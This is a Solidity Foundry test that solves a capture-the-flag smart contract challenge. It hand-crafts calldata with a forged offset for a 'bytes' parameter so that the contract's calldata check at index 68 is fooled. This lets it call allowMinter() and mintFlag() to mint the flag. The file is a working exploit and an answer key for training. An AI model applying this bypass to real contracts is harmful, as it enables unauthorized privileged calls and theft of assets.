// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {BaseTest} from "../BaseTest.sol";
import {Season2Challenge7} from "../../../src/season2/Season2Challenge7.sol";

contract Challenge7Test is BaseTest {
    Season2Challenge7 challenge7;

    function setUp() public {
        setUpChallenges();

        vm.startPrank(ADMIN);
        challenge7 = new Season2Challenge7(address(nftFlags));
        nftFlags.addAllowedMinter(address(challenge7));
        vm.stopPrank();
    }

    function test_challenge7() public {
        vm.startPrank(PLAYER, PLAYER);

        // The modifier checks the transaction's calldata at index 68 for the mintFlag selector.
        // We must manually craft calldata to call mint(bytes) with a custom offset for the 'bytes' parameter.
        
        bytes4 mintBytesSelector = bytes4(keccak256("mint(bytes)"));
        bytes4 targetCheckSelector = challenge7.mintFlagSelector();
        bytes4 allowSelector = bytes4(keccak256("allowMinter()"));
        bytes4 mintFlagSelector = bytes4(keccak256("mintFlag()"));

        // Step 1: Craft calldata to call allowMinter()
        // Index 0-3: mint(bytes) selector
        // Index 4-35: Offset to _data (Value: 128)
        // Index 36-67: Word 1 (Empty)
        // Index 68-71: targetCheckSelector (Passes modifier)
        // Index 72-99: Word 2 padding
        // Index 100-131: Word 3 (Empty)
        // Index 132-163: Word 4 (Length of _data: 4)
        // Index 164-167: allowMinter selector
        bytes memory payload1 = abi.encodePacked(
            mintBytesSelector,
            uint256(128), 
            uint256(0),
            targetCheckSelector,
            bytes28(0),
            uint256(0),
            uint256(4),
            allowSelector
        );

        (bool success1, ) = address(challenge7).call(payload1);
        require(success1, "allowMinter call failed");

        // Step 2: Craft calldata to call mintFlag()
        bytes memory payload2 = abi.encodePacked(
            mintBytesSelector,
            uint256(128), 
            uint256(0),
            targetCheckSelector,
            bytes28(0),
            uint256(0),
            uint256(4),
            mintFlagSelector
        );

        (bool success2, ) = address(challenge7).call(payload2);
        require(success2, "mintFlag call failed");

        // DONE: You should have obtained the flag for challenge #7
        assertTrue(nftFlags.hasMinted(PLAYER, 7));
    }
}